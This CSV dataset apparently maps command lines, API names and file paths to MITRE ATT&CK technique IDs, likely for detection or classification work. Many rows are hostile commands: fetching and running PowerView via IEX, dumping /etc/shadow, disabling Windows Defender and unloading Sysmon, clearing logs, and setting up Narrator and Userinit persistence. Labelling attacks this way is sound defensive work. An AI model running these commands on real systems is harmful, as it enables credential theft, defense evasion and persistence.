command,mitre_id
"/usr/libexec/PlistBuddy -c ""print :CFBundleVersion"" /Applications/Safari.app/Contents/Info.plist",T1518
MicrosoftInternetExplorerCrashRepoeterTaskMachineUA,T1036
"timeout --preserve-status $timeout whois -h $remote_host -p $remote_port ""$query"" > $output_file",T1105
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose,T1558
echo Username: %USERNAME% > %file%,T1033
touch -m -t 197001010000.00 $target_filename,T1070
"IF EXIST ""%temp%\Windows_Defender_Cleanup.xml"" ( schtasks /delete /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Cleanup"" /f )",T1562
rpmdb --eval '%(/bin/sh 1>&2)',T1059
"wmic qfe get description,installedOn /format:csv",T1047
ConnectNamedPipe,T1106
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableBehaviorMonitoring"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
cont,T1548
"wmic.exe process call create ""{PATH_ABSOLUTE}:program.exe""",T1564
%WINDIR%\SYSTEM32\oci.dll,T1574
AddPrintProcessor,T1547
atbroker /start malware_test,T1546
GetUserDefaultUILanguage,T1614
"Copy-Item ""$PathToAtomicsFolder\T1547.002\bin\package.dll"" C:\Windows\System32\",T1547
/var/log/auth.log,T1070
"net groups ""Account Operators"" /domain",T1069
rm -f $file_to_delete,T1070
systemd-resolve --status,T1548
audit.conf,T1562
InstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.,T1218
Win32_OperatingSystem,T1518
scanmem,T1059
LASTBOOTUP,T1082
"Write-Host "" [-] Attempting ${password} on account $user.""",T1110
svchast.exe,T1036
C:\Windows\system32\cmd.exe /c cmd /c ipconfig /all 2>&1,T1016
autocheck autochk *,T1547
msiexec,T1218
"Invoke-WebRequest -Uri ""https://download.qfxsoftware.com/download/latest/KeyScrambler_Setup.exe"" -OutFile $env:Temp\KeyScrambler_Setup.exe",T1574
hping3,T1059
sudo cat /etc/shadow > $output_file,T1003
dmsetup create base <<EOF,T1059
xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC},T1218
FindFirstVolumeW(),T1083
wmic process get /format:list,T1057
if(-not (Test-Path $filepath)){,T1041
"New-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name DefaultPassword -Value password1 -Force",T1562
touch configure.ac,T1059
netsh.exe advfirewall firewall show rule name=all,T1518
csplit -z -b '%doutput-file' /path/to/temp-file 1,T1222
CreateCompatibleDC,T1113
"Stop-Process -Name ""notepad"" -force -erroraction silentlycontinue",T1134
"Start-Process ""PowerPnt""",T1137
findstr /S cpassword %logonserver%\sysvol\*.xml,T1552
GetAdaptersInfo,T1016
test -e $input_file && gzip -k $input_file || (echo '$input_content' >> $input_file; gzip -k $input_file),T1560
example.service,T1053
"jrunscript -e 'var fw=new java.io.FileWriter(""/path/to/output-file"");",T1222
"if [ ""$(uname)"" = 'FreeBSD' ]; then cmd=""b64decode -r""; else cmd=""base64 -d""; fi;",T1027
security find-generic-password -wa wifiname,T1016
realpath,T1562
certutil -hashfile,T1105
systemd-run -t /bin/sh,T1059
powershell .(nslookup -q=txt example.com 8.8.8.8)[-1],T1059
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Narrator.exe,T1546
"Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Userinit"" ""Userinit.exe, $binary_to_execute"" -Force",T1547
"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:""$output_file"" /target:exe ""$source_file""",T1106
fltmc.exe unload $sysmon_driver,T1562
SharpCloud -consoleoutput -noninteractive,T1552
"Write-Output ""File downloaded: $($tmpFunctionCode)""",T1528
evil-winrm -i $destination_address -u $user_name -p $password,T1021
"msedgewebview2.exe --utility-cmd-prefix=""{CMD}""",T1218
FindNextFile,T1083
cmd.exe /Q /c $command_to_execute 1> \\127.0.0.1\ADMIN$\$output_file 2>&1,T1021
/Library/logs,T1070
"tasklist.exe | findstr /i ""virus cb defender cylance mc""",T1518
/dsgetdc,T1018
truncate --size=0 /var/log/security #size parameter,T1070
GrayStringW,T1106
wget http://103.224.80[.]44:8080/kernel,T1071
gcloud compute disks list,T1680
ImprovedReflectiveDLLInjection,T1055
esentutl.exe /y /vss $file_path /d $copy_dest/$file_name,T1003
/usr/local/lib/udev/rules.d/,T1546
"python -c 'from ctypes import cdll; cdll.LoadLibrary(""/path/to/lib.so"")'",T1574
Start-ATHProcessUnderSpecificParent -ParentId $parent_pid -TestGuid $test_guid,T1134
C:\Windows\System32\spool\prtprocs\x64\winprint.dll,T1543
Manufacturer,T1497
PTASpy,T1556
"[K]::keybd_event($VK_LWIN, 0, $KEYUP, [UIntPtr]::Zero)",T1566
"Write-Host 3.Copying KeyScrambler.exe to temp folder,to avoid permission issues, which calls KeyScramblerIE.dll in CWD i.e. temp",T1574
